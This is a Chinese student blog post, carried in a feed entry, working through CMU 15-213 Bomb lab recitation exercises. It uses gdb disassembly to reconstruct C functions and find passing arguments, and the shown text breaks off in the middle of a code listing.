        <link rel="alternate" href="https://salvely.github.io/blog/2024/02/29/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%A7%91%E5%AD%A6/%E7%B3%BB%E7%BB%9F/%E7%B3%BB%E7%BB%9F%E5%85%A5%E9%97%A8/15-213/15-213%20Activity/Bomb%20lab%20recitation/"/>
        <content type="html">&lt;h2 id=&#34;act1&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#act1&#34;&gt;#&lt;/a&gt; act1&lt;/h2&gt;
&lt;p&gt;依次输入如下指令：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;(gdb) disassemble main // show the assembly instructions in main
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;其 &lt;code&gt;main&lt;/code&gt;  函数反汇编结果如下：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;(gdb) disassemble main
Dump of assembler code for function main:
   0x0000000000401730 &amp;lt;+0&amp;gt;:     endbr64
   0x0000000000401734 &amp;lt;+4&amp;gt;:     push   %rbx
   0x0000000000401735 &amp;lt;+5&amp;gt;:     movslq %edi,%rdi
   0x0000000000401738 &amp;lt;+8&amp;gt;:     mov    %rsi,%rbx
   0x000000000040173b &amp;lt;+11&amp;gt;:    xor    %eax,%eax
   0x000000000040173d &amp;lt;+13&amp;gt;:    mov    -0x8(%rsi,%rdi,8),%rdx
   0x0000000000401742 &amp;lt;+18&amp;gt;:    lea    0xa8eb6(%rip),%rsi        # 0x4aa5ff
   0x0000000000401749 &amp;lt;+25&amp;gt;:    mov    $0x1,%edi
   0x000000000040174e &amp;lt;+30&amp;gt;:    callq  0x44b9a0 &amp;lt;__printf_chk&amp;gt;
   0x0000000000401753 &amp;lt;+35&amp;gt;:    movq   $0x0,(%rbx)
   0x000000000040175a &amp;lt;+42&amp;gt;:    pop    %rbx
   0x000000000040175b &amp;lt;+43&amp;gt;:    retq
End of assembler dump.
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;该汇编代码的过程如下：&lt;/p&gt;
&lt;figure class=&#34;highlight c&#34;&gt;&lt;figcaption data-lang=&#34;c&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;int&lt;/span&gt; &lt;span class=&#34;token function&#34;&gt;main&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token keyword&#34;&gt;int&lt;/span&gt; argc&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;char&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;*&lt;/span&gt;argv&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token keyword&#34;&gt;int&lt;/span&gt; ret &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token function&#34;&gt;printf&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;%s\n&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;argv&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;argc&lt;span class=&#34;token operator&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;4&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token keyword&#34;&gt;return&lt;/span&gt; ret&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;5&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;h2 id=&#34;act2&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#act2&#34;&gt;#&lt;/a&gt; act2&lt;/h2&gt;
&lt;p&gt;反汇编 &lt;code&gt;main&lt;/code&gt;  函数：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;(gdb) disas main
Dump of assembler code for function main:
   0x00000000004016c0 &amp;lt;+0&amp;gt;:     endbr64
   0x00000000004016c4 &amp;lt;+4&amp;gt;:     push   %rbx
   0x00000000004016c5 &amp;lt;+5&amp;gt;:     movslq %edi,%rdi
   0x00000000004016c8 &amp;lt;+8&amp;gt;:     mov    %rsi,%rbx
   0x00000000004016cb &amp;lt;+11&amp;gt;:    mov    -0x8(%rsi,%rdi,8),%rsi
   0x00000000004016d0 &amp;lt;+16&amp;gt;:    lea    0x9392d(%rip),%rdi        # 0x495004
   0x00000000004016d7 &amp;lt;+23&amp;gt;:    callq  0x401c75 &amp;lt;stc&amp;gt;
   0x00000000004016dc &amp;lt;+28&amp;gt;:    movq   $0x0,(%rbx)
   0x00000000004016e3 &amp;lt;+35&amp;gt;:    pop    %rbx
   0x00000000004016e4 &amp;lt;+36&amp;gt;:    retq
End of assembler dump.
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;输入下列指令用 16 进制打印 &lt;code&gt;%rsi&lt;/code&gt;  和 &lt;code&gt;%rdi&lt;/code&gt;  的值：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;(gdb) print /x $rsi
$1 = 0x7fffffffdf18
(gdb) print /x $rdi
$2 = 0x1
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;由此看 &lt;code&gt;$rdi&lt;/code&gt;  应该是 &lt;code&gt;argc&lt;/code&gt; , 而 &lt;code&gt;$rsi&lt;/code&gt;  应该是 &lt;code&gt;argv&lt;/code&gt; 。&lt;/p&gt;
&lt;p&gt;再输入 &lt;code&gt;disas stc&lt;/code&gt; ，获得如下结果：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;(gdb) disas stc
Dump of assembler code for function stc:
   0x0000000000401c75 &amp;lt;+0&amp;gt;:     push   %rbx
   0x0000000000401c76 &amp;lt;+1&amp;gt;:     mov    %rsi,%rbx
   0x0000000000401c79 &amp;lt;+4&amp;gt;:     callq  0x4115d0 &amp;lt;puts&amp;gt;
   0x0000000000401c7e &amp;lt;+9&amp;gt;:     mov    %rbx,%rdi
   0x0000000000401c81 &amp;lt;+12&amp;gt;:    callq  0x4115d0 &amp;lt;puts&amp;gt;
   0x0000000000401c86 &amp;lt;+17&amp;gt;:    pop    %rbx
   0x0000000000401c87 &amp;lt;+18&amp;gt;:    retq
   0x0000000000401c88 &amp;lt;+19&amp;gt;:    nopl   0x0(%rax,%rax,1)
End of assembler dump.
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;将其转化为 C 语言函数应该是：&lt;/p&gt;
&lt;figure class=&#34;highlight c&#34;&gt;&lt;figcaption data-lang=&#34;c&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;// a:rsi b:rdi&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;int&lt;/span&gt; &lt;span class=&#34;token function&#34;&gt;stc&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token keyword&#34;&gt;char&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;*&lt;/span&gt; a&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;char&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;*&lt;/span&gt; b&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;4&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;   &lt;span class=&#34;token comment&#34;&gt;// 压入原 rbx&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;5&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;   rbx &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; rsi&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;6&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;   &lt;span class=&#34;token function&#34;&gt;puts&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;rbx&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;7&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;   rdi &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; rbx&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;8&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;   &lt;span class=&#34;token function&#34;&gt;puts&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;rbx&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;9&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;   &lt;span class=&#34;token comment&#34;&gt;// 恢复 rbx&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;10&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;   &lt;span class=&#34;token comment&#34;&gt;//nopl 是干嘛用的？&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;11&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;   &lt;span class=&#34;token keyword&#34;&gt;return&lt;/span&gt; rax&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;12&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;h2 id=&#34;act3&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#act3&#34;&gt;#&lt;/a&gt; act3&lt;/h2&gt;
&lt;p&gt;观察 &lt;code&gt;main&lt;/code&gt;  函数的 C 代码，发现只要 &lt;code&gt;compare&lt;/code&gt;  函数返回 1 即可通关。对 &lt;code&gt;compare&lt;/code&gt;  函数进行反汇编可得：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;(gdb) disas compare
Dump of assembler code for function compare:
   0x0000000000401c95 &amp;lt;+0&amp;gt;:     push   %rbx
   0x0000000000401c96 &amp;lt;+1&amp;gt;:     mov    %rdi,%rbx
   0x0000000000401c99 &amp;lt;+4&amp;gt;:     add    $0x5,%rbx
   0x0000000000401c9d &amp;lt;+8&amp;gt;:     add    %rsi,%rbx
   0x0000000000401ca0 &amp;lt;+11&amp;gt;:    cmp    $0x3b6d,%rbx
   0x0000000000401ca7 &amp;lt;+18&amp;gt;:    sete   %al
   0x0000000000401caa &amp;lt;+21&amp;gt;:    movzbq %al,%rax
   0x0000000000401cae &amp;lt;+25&amp;gt;:    pop    %rbx
   0x0000000000401caf &amp;lt;+26&amp;gt;:    retq
End of assembler dump.
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;还原其 C 代码如下：&lt;/p&gt;
&lt;figure class=&#34;highlight c&#34;&gt;&lt;figcaption data-lang=&#34;c&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;// rdi:a rsi:b&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;int&lt;/span&gt; &lt;span class=&#34;token function&#34;&gt;compare&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token keyword&#34;&gt;int&lt;/span&gt; a&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token keyword&#34;&gt;int&lt;/span&gt; b&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;4&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;   &lt;span class=&#34;token keyword&#34;&gt;int&lt;/span&gt; ret&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;5&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;   &lt;span class=&#34;token comment&#34;&gt;// 压入原 rbx&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;6&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;   rbx &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; a&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;7&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;   rbx &lt;span class=&#34;token operator&#34;&gt;+=&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;0x5&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;8&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;   rbx &lt;span class=&#34;token operator&#34;&gt;+=&lt;/span&gt; b&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;9&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;   rbx &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; a &lt;span class=&#34;token operator&#34;&gt;+&lt;/span&gt; b &lt;span class=&#34;token operator&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;0x5&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;10&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;   &lt;span class=&#34;token keyword&#34;&gt;if&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;rbx &lt;span class=&#34;token operator&#34;&gt;==&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;0x3b6d&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;11&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;      ret &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;12&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;   &lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;13&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;   &lt;span class=&#34;token keyword&#34;&gt;else&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;14&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;      ret &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;15&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;   &lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;16&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;   &lt;span class=&#34;token comment&#34;&gt;// 恢复原 Rbx&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;17&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;   &lt;span class=&#34;token keyword&#34;&gt;return&lt;/span&gt; ret&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;18&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;发现 &lt;code&gt;compare&lt;/code&gt;  就要求 &lt;code&gt;a + b = 0x3b68(10进制15208)&lt;/code&gt; 。在 &lt;code&gt;gdb&lt;/code&gt;  中只能输入 10 进制数字，如果输入 16 进制数字的话会被当成字符串。运行 &lt;code&gt;./act3 15208 0&lt;/code&gt; ，成功！&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;gwen@gwen-virtual-machine:~/Documents/report/code/15213/Ch3 Machine Level Programming/rec4$ ./act3 15208 0
good args!
&lt;/code&gt;&lt;/pre&gt;
&lt;h2 id=&#34;act4&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#act4&#34;&gt;#&lt;/a&gt; act4&lt;/h2&gt;
&lt;p&gt;先查看 &lt;code&gt;act4.c&lt;/code&gt;  的代码，看看是干嘛的：&lt;/p&gt;
&lt;figure class=&#34;highlight c&#34;&gt;&lt;figcaption data-lang=&#34;c&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;void&lt;/span&gt; &lt;span class=&#34;token function&#34;&gt;compute&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token keyword&#34;&gt;int&lt;/span&gt; inArg&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token keyword&#34;&gt;int&lt;/span&gt; st&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;4&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    inArg &lt;span class=&#34;token operator&#34;&gt;*=&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;3&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;5&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    st &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; inArg &lt;span class=&#34;token operator&#34;&gt;&amp;amp;&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;0xf&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;6&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token keyword&#34;&gt;do&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;7&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        &lt;span class=&#34;token keyword&#34;&gt;switch&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;st&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;8&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        &lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;9&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;            &lt;span class=&#34;token keyword&#34;&gt;case&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;token function&#34;&gt;printf&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;Finish\n&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt; inArg &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;break&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;10&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;            &lt;span class=&#34;token keyword&#34;&gt;case&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;:&lt;/span&gt; inArg &lt;span class=&#34;token operator&#34;&gt;*=&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;2&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;break&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;11&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;            &lt;span class=&#34;token keyword&#34;&gt;case&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;2&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;:&lt;/span&gt; inArg &lt;span class=&#34;token operator&#34;&gt;&gt;&gt;=&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;2&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;break&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;12&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;            &lt;span class=&#34;token keyword&#34;&gt;case&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;3&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;:&lt;/span&gt; inArg &lt;span class=&#34;token operator&#34;&gt;&amp;amp;=&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;break&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;13&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;            &lt;span class=&#34;token keyword&#34;&gt;case&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;4&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;:&lt;/span&gt; inArg&lt;span class=&#34;token operator&#34;&gt;--&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;break&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;14&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;            &lt;span class=&#34;token keyword&#34;&gt;default&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;:&lt;/span&gt;  &lt;span class=&#34;token keyword&#34;&gt;break&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;15&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        &lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;16&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        st &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; inArg &lt;span class=&#34;token operator&#34;&gt;&amp;amp;&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;0xf&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;17&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span 